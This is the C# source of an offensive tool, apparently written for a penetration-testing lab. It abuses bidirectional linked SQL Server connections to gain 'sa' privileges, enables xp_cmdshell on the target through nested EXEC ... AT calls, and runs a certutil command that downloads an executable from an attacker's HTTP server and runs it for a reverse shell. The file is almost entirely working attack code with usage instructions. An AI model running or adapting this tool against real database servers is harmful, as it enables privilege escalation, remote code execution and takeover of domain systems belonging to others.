// LinkedSQLPrivEscRevShell.cs
// Tool for bidirectional linked SQL Server privilege escalation + reverse shell
// Usage: LinkedSQLPrivEscRevShell.exe <appsrv_ip> <dc_link_name> <app_link_name> <attacker_ip> <http_port> <payload_filename>
// Example: LinkedSQLPrivEscRevShell.exe 192.168.146.6 DC01 APPSRV01 192.168.45.242 8000 reverse.exe

using System;
using System.Data.SqlClient;

namespace SQLLinkedRevShell
{
    class Program
    {
        static void Main(string[] args)
        {
            // Parse command-line arguments
            if (args.Length != 6)
            {
                Console.WriteLine("Usage: <appsrv_ip> <dc_link_name> <app_link_name> <attacker_ip> <http_port> <payload_file>");
                Console.WriteLine("Example: 192.168.146.6 DC01 APPSRV01 192.168.45.242 8000 reverse.exe");
                return;
            }

            string sqlServer = args[0];      // IP of initial SQL server (appsrv01)
            string dcLink = args[1];         // Linked server name for DC01 on appsrv01
            string appLink = args[2];        // Linked server name for APPSRV01 on DC01
            string attackerIP = args[3];     // Your attacker IP
            string httpPort = args[4];       // Port hosting payload
            string payloadFile = args[5];    // Filename of payload (e.g. reverse.exe)

            string database = "master";

            // Connection uses current Windows user (Integrated Security)
            string conString = $"Server={sqlServer};Database={database};Integrated Security=True;";

            using (SqlConnection con = new SqlConnection(conString))
            {
                try { con.Open(); Console.WriteLine("[+] Connected to " + sqlServer); }
                catch (Exception e) { Console.WriteLine("[-] Connection failed: " + e.Message); return; }

                // Verify privilege escalation (should show 'sa')
                Console.WriteLine("[*] Checking elevated context...");
                string verify = $"SELECT SYSTEM_USER AS mylogin FROM OPENQUERY(\"{dcLink}\", 'SELECT SYSTEM_USER AS mylogin FROM OPENQUERY(\"{appLink}\", ''SELECT SYSTEM_USER AS mylogin'')')";
                ExecQuery(con, verify, "Elevated as");

                // Enable show advanced options on target (appsrv01 via DC01)
                Console.WriteLine("[*] Enabling advanced options...");
                Exec(con, $"EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; RECONFIGURE;'') AT [{appLink}]') AT [{dcLink}]");

                // Enable xp_cmdshell on target
                Console.WriteLine("[*] Enabling xp_cmdshell...");
                Exec(con, $"EXEC ('EXEC (''sp_configure ''''xp_cmdshell'''', 1; RECONFIGURE;'') AT [{appLink}]') AT [{dcLink}]");

                // Build payload command
                string url = $"http://{attackerIP}:{httpPort}/{payloadFile}";
                string path = $@"C:\Users\Public\{payloadFile}";
                string payloadCmd = $"cmd /c certutil -urlcache -f {url} {path} && {path}";

                Console.WriteLine("[*] Executing payload download & run...");
                Exec(con, $"EXEC ('EXEC (''xp_cmdshell ''''{payloadCmd}'''' '') AT [{appLink}]') AT [{dcLink}]");

                Console.WriteLine("[+] Payload sent. Check your listener.");
            }
        }

        // Helper: Execute query and print first column if reader
        static void ExecQuery(SqlConnection con, string query, string prefix)
        {
            try
            {
                using (SqlCommand cmd = new SqlCommand(query, con))
                using (SqlDataReader r = cmd.ExecuteReader())
                {
                    if (r.Read()) Console.WriteLine($"[+] {prefix}: {r.GetString(0)}");
                }
            }
            catch (Exception e) { Console.WriteLine("[-] Query error: " + e.Message); }
        }

        // Helper: Execute non-query (config changes, xp_cmdshell)
        static void Exec(SqlConnection con, string query)
        {
            try
            {
                using (SqlCommand cmd = new SqlCommand(query, con))
                {
                    cmd.CommandTimeout = 120;
                    cmd.ExecuteNonQuery();
                }
            }
            catch (Exception e) { Console.WriteLine("[-] Exec error: " + e.Message); }
        }
    }
}